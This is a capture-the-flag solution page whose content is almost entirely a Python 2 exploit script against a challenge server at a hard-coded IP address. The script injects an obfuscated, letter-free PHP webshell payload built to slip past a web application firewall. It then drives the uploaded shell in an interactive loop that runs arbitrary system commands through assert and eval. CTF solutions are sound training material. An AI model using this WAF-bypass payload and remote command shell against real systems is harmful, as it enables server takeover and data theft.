#### Goals
 * Get the flag

#### Solution
```python
#!/usr/bin/env python

import requests
import string

password = "c"
webshell = "$_=[].[];$__='';$_=$_[''];$_=++$_;$_=++$_;$_=++$_;$_=++$_;$__.=$_;$_=++$_;$_=++$_;$__=$_.$__;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$__.=$_;${'_'.$__}[_](${'_'.$__}[__]);".replace("+","%"+"+".encode("hex"))
base_url = "http://120.24.215.80:10010/"
writeable = "uploads/"
webshell_url = ""

def exploit():
        global webshell_url
        url = base_url + ("?c=%s" % (webshell))
        # print "[+] Payload : %s" % (url)
	response = requests.get(url)
        content = response.content
        webshell_path = content.split("<a href='")[1].split("'>WebShell</a></br>Enjoy your webshell~")[0]
        print "[+] Webshell path : %s" % (webshell_path)
        webshell_url = base_url + webshell_path
        # print "[+] Response : %s" % (content)
        return "WAF" not in content

def shell(webshell_url):
	while True:
		command = raw_input("=>")
		if string.lower(command) == "exit":
			break
		# system, exec, shell_exec, popen, proc_open, passthru
                url = webshell_url + ("?_=assert&__=eval($_POST[%s])" % (password))
		data = {password:"system('%s');" % (command)}
		response = requests.post(url, data=data)
                print "[+] Status => [%d]" % (response.status_code)
		print response.text
		pass

def main():
	print "[+] Lauching attack"
	result = exploit()
	if result == True:
		print "[+] Exploited!"
		# print "[+] The webshell is : %s" % (webshell)
		print "[+] Stored at : %s" % (webshell_url)
	        shell(webshell_url)
	else:
            print "[-] Exploit failed! Error : WAF"

if __name__ == '__main__':
	main()
```

#### Writeups
 * [Offical Writeup]()
 * [Other Writeup]()

